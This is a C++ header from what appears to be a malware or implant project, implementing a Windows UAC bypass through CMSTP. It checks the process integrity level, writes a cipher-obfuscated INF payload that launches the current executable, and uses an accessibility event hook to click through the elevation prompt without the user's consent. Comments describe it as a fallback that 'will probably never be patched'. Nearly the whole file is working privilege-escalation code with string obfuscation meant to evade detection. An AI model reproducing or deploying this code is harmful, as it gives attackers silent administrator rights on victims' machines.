#pragma once
#define ESCALATION_API __declspec(dllimport) 
#define INTEGRITY_UNKNOWN 0xFF
#define INTEGRITY_NONE 0x00
#define INTEGRITY_LOW 0x01
#define INTEGRITY_MEDIUM 0x02
#define INTEGRITY_HIGH 0x03
#define INTEGRITY_SYSTEM 0x04
#define ULONG_MAX     0xffffffffUL
#define MSGF_SLEEPMSG 0x5300

#include <windows.h>
#include <stdio.h>
#include "phnt_windows.h"
#include "phnt.h"
#include <thread>

#include "Cipher.hpp"

HWINEVENTHOOK exmInitializeMSAA(std::wstring& sPayloadPath);
void exmShutdownMSAA(HWINEVENTHOOK hwekWND);
BOOL CALLBACK exmButtonCallback(HWND _In_ hwnd);
LPVOID GetMainModuleBaseSecure();
void CALLBACK exmHandleWinEvent(
    _In_ HWINEVENTHOOK hook,
    _In_ DWORD event, _In_ HWND hwnd,
    _In_ LONG idObject, _In_ LONG idChild,
    _In_ DWORD dwEventThread, _In_ DWORD dwmsEventTime);

// TODO: Add AutoElevation module from Ultron

class AutoElevation
{
public:
    BOOL IReady;
    
    AutoElevation(COMWrapper& com_wrapper, Railfence& cipher_class, UACInterface& uac_interface) :
    ICom(com_wrapper), ICiph(cipher_class), IUAC(uac_interface), IReady(FALSE)
    {
        IReady = TRUE;
    }

    BOOL AutoElevate()
    {
        // We need to double check we're not
        // already running as SYSTEM
        
        // This isn't really necessary but its a solid
		// check to make doubly sure we're not already elevated.
        // This way we'll avoid any accidental forkbombs if our 
        // elevation check fails due to an unforeseen WMI security 
        // context issue
        
		DWORD dwIntegrityLevel = INTEGRITY_UNKNOWN;
		ULONG uElevationLevel = IUAC.CheckElevation();
        HANDLE hProcess = GetCurrentProcess();
        
        dwIntegrityLevel = GetProcessIntegrityLevel(GetCurrentProcess());

        switch (dwIntegrityLevel)
        {
            case INTEGRITY_SYSTEM:
            case INTEGRITY_HIGH:
                ILog("Already elevated\n");
                break;
            case INTEGRITY_MEDIUM:
            case INTEGRITY_LOW:
                switch (uElevationLevel)
                {
                    case 0x1:
                    case 0x2:
                        return TRUE;
                    case 0x3:
                    case 0x4:
                    default:
                        CMSTPAutoElevate();
                        break;
                }
            case INTEGRITY_UNKNOWN:
            default:
                ILog("Unknown error checking integrity level\n");
                break;
        }
		
        // If we end up here, we've failed to escalate
        
        return FALSE;
    }
    
private:
    DWORD GetProcessIntegrityLevel(HANDLE hProcess)
    {
        HANDLE hToken;

        DWORD dwLengthNeeded;
        DWORD dwError = ERROR_SUCCESS;

        PTOKEN_MANDATORY_LABEL pTIL = NULL;
        LPWSTR pStringSid;
        DWORD dwIntegrityLevel;

        if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
        {
            // Get the Integrity level.
            if (!GetTokenInformation(hToken, TokenIntegrityLevel,
                NULL, 0, &dwLengthNeeded))
            {
                dwError = GetLastError();
                if (dwError == ERROR_INSUFFICIENT_BUFFER)
                {
                    pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,
                        dwLengthNeeded);
                    if (pTIL != NULL)
                    {
                        if (GetTokenInformation(hToken, TokenIntegrityLevel,
                            pTIL, dwLengthNeeded, &dwLengthNeeded))
                        {
                            dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
                                (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

                            if (dwIntegrityLevel < SECURITY_MANDATORY_MEDIUM_RID)
                            {
                                CloseHandle(hToken);
                                // Low Integrity
                                return INTEGRITY_LOW;
                            }
                            else if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
                            {
                                CloseHandle(hToken);
                                // Medium Integrity
                                return INTEGRITY_MEDIUM;
                            }
                            else if (dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID)
                            {
                                CloseHandle(hToken);
                                // High Integrity
                                return INTEGRITY_HIGH;
                            }
                            else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
                            {
                                CloseHandle(hToken);
                                // System Integrity
                                return INTEGRITY_SYSTEM;
                            }

                            else
                            {
                                CloseHandle(hToken);
                                return INTEGRITY_UNKNOWN;
                            }

                        }
                        LocalFree(pTIL);
                    }
                }
            }
            CloseHandle(hToken);
        }
        return INTEGRITY_UNKNOWN;
    }
    
    std::string EncodeUTF8(const std::wstring& wstr)
    {
        if (wstr.empty()) return std::string();
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
        std::string strTo(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
        return strTo;
    }
    
    BOOL CMSTPWritePayload(
    _Out_ std::wstring& sFilePath)
    {
        // Write our payload to the disk   

        // Get the path to the current module
		LPWSTR lpFilename = new WCHAR[MAX_PATH];
        if (!GetModuleFileName(NULL, lpFilename, MAX_PATH))
        {
            ILog("Failed to get module filename: %d\n", GetLastError());
            return FALSE;
        }

        // Get the path to the temp folder
        LPWSTR lpTempPath = new WCHAR[MAX_PATH];
        if (!GetTempPath(MAX_PATH, lpTempPath))
        {
            ILog("Failed to get temp file path: %d\n", GetLastError());
            return FALSE;
        }

		// Add the temp file name to the path
		LPWSTR lpTempFile = new WCHAR[MAX_PATH];
		if (!GetTempFileName(lpTempPath, L"tmp", 0, lpTempFile))
        {
            ILog("Failed to get temp filename: %d\n", GetLastError());
            return FALSE;
        }

        // We use the modified railfence cipher
        // because the strings are low entropy
        std::wstring lpPayload[] = {
            L"[]vneoris",
            L"Segir=aogu$c$ntciah",
            L"AIddNveF5ac=.n2",
            L"[IDtn]elslfutlaa",
            L"CsnscUueto=ntetlssDiiCIDSiletmntutetoAroassns",
            L"RtnroeueuadPeCmScnSpmsnSpmstPeCm=ueuadinroRtno",
            L"[eaiRStmntoueumdcnnrpose]PCS",
            lpFilename, // payload location
            L"t tFal/sp/slIm. kiMceek x",
            L"[ttsCsDciUeuneeolrsIsSnlsttA]",
            L"40SS 990UeDe,7041lrIcn0,=l_Dto0ALi",
            L"[_tArLcileDeolSISnUD]",
            L"\"\"EooeoaG\"il eoH SR\\sfdwrninPtMRE,flal,\"pcrr\"K,OAMotnsrts\\ hM3X oetP\"%xtr%\"L\"FWir\\i\\uVrApsC2E\"rIsahUeeE\" MTcWCep\\.Pntnd,",
            L"[]Sstgrni",
            L"SayteNmr  hreeeltivc=Vein\"i\"gg",
            L"SNr hcaeyttovmV ih\"rSe\"lgigt=en"
        };

        // Open the file for writing
		HANDLE hFile = CreateFile(
			lpTempFile,
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
        
        // Write the file
        DWORD dwBytesWritten = 0;
        
        for (auto& line : lpPayload)
        {
            std::wstring lpdLine;

            // If its not the filepath line (which is not enciphered)
            if (line != lpFilename)
            {
                // Decode the line
                ICiph.decipher(5, line, lpdLine);
            }
            else
            {
				// Use the original line
				lpdLine = line;
            }

            // Change encoding from UTF16 to UTF8
            std::string lpdLineUTF8;
			lpdLineUTF8 = EncodeUTF8(lpdLine);

            // Write the line
            if(!WriteFile(hFile, lpdLineUTF8.c_str(), lpdLineUTF8.length(), &dwBytesWritten, NULL))
                return FALSE;

            if (dwBytesWritten == 0)
                return FALSE;
            
			// Add a newline
            if (!WriteFile(hFile, "\n", 1, &dwBytesWritten, NULL))
                return FALSE;
            
            if (dwBytesWritten == 0)
                return FALSE;
        }
        
        // File was written
        ILog("Successfully wrote payload to disk: %ls\n", lpTempFile);
		CloseHandle(hFile);

		// Return the path to the file
		sFilePath = lpTempFile;

        // Cleanup
        delete[] lpFilename;
        delete[] lpTempPath;
        delete[] lpTempFile;

        return TRUE;
    }
    
    // Hacky but a reliable fallback option that will probably
    // never be patched
    BOOL CMSTPAutoElevate()
    {
        // Write the payload to disk
        std::wstring sFilePath;
        if (!CMSTPWritePayload(sFilePath))
        {
            ILog("Failed to write payload to disk\n");
            return FALSE;
        }
        
        // Initialize the windows event hook (AutoEscalation.lib)
        HWINEVENTHOOK hwkEvent = exmInitializeMSAA(sFilePath);
        MSG msg;

        // Setup timeout timer
        DWORD dwTimeout = 5000;
        DWORD dwStart = GetTickCount();
        DWORD dwElapsed;

		// Set interprocess event for escalation
        const HANDLE hEvent = CreateEvent(0, FALSE, FALSE, L"{REDISTRIBUTED-ADMIN-PRIVS-COMRADE}");
        const HANDLE hArray[] = { hEvent };

        // While the timer has not elapsed
        while ((dwElapsed = GetTickCount() - dwStart) < dwTimeout) {

			// Wait for the event to be signaled while pumping messages
            DWORD dwStatus = MsgWaitForMultipleObjectsEx(_countof(hArray), hArray,
                dwTimeout - dwElapsed, QS_ALLINPUT,
                MWMO_INPUTAVAILABLE);

            // Event was signaled
            if (dwStatus == WAIT_OBJECT_0)
            {
                ILog("Escalated\n");
                ExitThread(0);
            }

			// Message was received
            if (dwStatus != WAIT_OBJECT_0)
            {
                MSG msg;
                while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                    if (msg.message == WM_QUIT) {
                        PostQuitMessage((int)msg.wParam);
                        exmShutdownMSAA(hwkEvent);
                        ExitThread(0);
                    }
                    if (!CallMsgFilter(&msg, MSGF_SLEEPMSG)) {
                        TranslateMessage(&msg);
                        DispatchMessage(&msg);
                    }
                }
            }
        }
        exmShutdownMSAA(hwkEvent);
        
        // If we're here, we timed out, so escalation failed
        ILog("Timed out waiting for escalation\n");
        return FALSE;
    }

    private:
    COMWrapper& ICom;
    Railfence ICiph;
    UACInterface& IUAC;
};